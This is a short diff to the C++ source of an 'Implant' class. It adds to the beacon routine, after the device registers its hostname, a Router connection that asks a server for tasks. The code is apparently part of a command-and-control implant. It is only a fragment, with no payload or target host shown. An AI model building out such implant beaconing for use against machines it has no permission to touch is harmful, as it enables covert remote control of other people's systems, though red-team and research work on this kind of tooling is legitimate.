@@ -1,5 +1,5 @@
 #include "implant.hpp"
-
+#include "router.hpp"
 
 #include <string>
 #include <string_view>
@@ -35,6 +35,12 @@ void Implant::beacon() {
     /* Register device */
     auto host = boost::asio::ip::host_name(); 
     api.register_device(id, host);
+
+    Router router = Router();
+    // router.server();
+    int socket = router.establish_connection();
+
+    router.client_send(socket, MessageFactory::create_get_tasks(ref(id)));
 
     /* Loop */
     while (true)
